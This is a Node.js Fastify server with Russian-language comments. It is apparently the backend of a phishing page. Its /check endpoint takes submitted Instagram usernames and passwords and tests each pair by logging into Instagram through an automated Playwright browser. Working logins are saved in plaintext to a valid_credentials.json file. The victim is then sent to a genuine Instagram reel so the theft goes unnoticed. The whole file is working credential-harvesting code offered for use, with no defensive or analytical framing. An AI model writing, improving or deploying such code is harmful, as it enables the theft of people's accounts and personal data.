const Fastify = require("fastify");
const { chromium } = require("playwright");
const fs = require("fs");
const cors = require("@fastify/cors");

const PORT = process.env.PORT || 3000;
const DATA_FILE = "valid_credentials.json";

const app = Fastify();
app.register(cors);

// Функция валидации логина и пароля
function validateCredentials(username, password) {
    if (!username || !password) {
        return { valid: false, message: "Логин и пароль обязательны!" };
    }

    if (password.length < 6) {
        return { valid: false, message: "Пароль должен быть минимум 6 символов." };
    }

    const usernameRegex = /^[a-zA-Z0-9._]+$/;
    if (!usernameRegex.test(username)) {
        return { valid: false, message: "Логин должен содержать только буквы, цифры и точки/подчеркивания." };
    }

    return { valid: true };
}

// Функция сохранения успешных логинов
function saveCredentials(username, password) {
    let credentials = [];
    if (fs.existsSync(DATA_FILE)) {
        credentials = JSON.parse(fs.readFileSync(DATA_FILE, "utf-8"));
    }
    credentials.push({ username, password });
    fs.writeFileSync(DATA_FILE, JSON.stringify(credentials, null, 2));
}

// Обработчик POST-запроса на /check
app.post("/check", async (request, reply) => {
    console.log("Новый POST-запрос на /check", request.body);

    const { username, password } = request.body;
    const validation = validateCredentials(username, password);
    if (!validation.valid) {
        console.log("Ошибка валидации:", validation.message);
        return reply.send({ error: true, message: validation.message });
    }

    console.log(`Начинаем проверку логина для пользователя: ${username}`);

    const browser = await chromium.launch({ headless: false });
    const page = await browser.newPage();

    try {
        console.log("Загружаем страницу авторизации...");
        await page.goto("https://www.instagram.com/accounts/login/");
        console.log("Загружена страница авторизации...");

        await page.waitForSelector("input[name='username']", { timeout: 5000 });
        await page.fill("input[name='username']", username);
        await page.fill("input[name='password']", password);
        await page.click("button[type='submit']");
        
        // Ожидание загрузки после нажатия
        await page.waitForTimeout(5000);

        let loginSuccess = false;
        for (let i = 0; i < 10; i++) {
            await page.waitForTimeout(1000);
            const currentUrl = page.url();
            console.log("Текущий URL:", currentUrl);

            const errorMessage = await page.locator("div.xkmlbd1.xvs91rp.xd4r4e8.x1anpbxc.x1m39q7l.xyorhqc.x540dpk.x2b8uid").count();
            if (errorMessage > 0) {
                console.log("Ошибка входа: неверные данные.");
                await browser.close();
                return reply.send({ error: true, message: "Неверный логин или пароль" });
            }

            if (currentUrl !== "https://www.instagram.com/accounts/login/") {
                loginSuccess = true;
                break;
            }
        }

        await browser.close();

        if (loginSuccess) {
            console.log(`Пользователь ${username} успешно вошел в аккаунт.`);
            saveCredentials(username, password);
            return reply.send({ error: false, message: "Успешный вход в Instagram", redirectUrl: "https://www.instagram.com/reel/DGZvsOutpww/?igsh=MWozYjZtbWhyeHZvaA==" });
        } else {
            console.log("Ошибка входа: URL не изменился.");
            return reply.send({ error: true, message: "Неверный логин или пароль" });
        }
    } catch (error) {
        console.error("Ошибка при входе в Instagram:", error);
        await browser.close();
        return reply.send({ error: true, message: "Ошибка сервера" });
    }
});

// Обработчик GET-запроса на /
app.get("/", async (request, reply) => {
    console.log("Новый GET-запрос на /");
    reply.send("Сервер работает!");
});

// Запуск сервера на 0.0.0.0 (важно для Render)
app.listen({ port: PORT, host: '0.0.0.0' }, (err, address) => {
    if (err) {
        console.error("Ошибка запуска сервера:", err);
        process.exit(1);
    }
    console.log(`Сервер запущен на ${address}`);
});
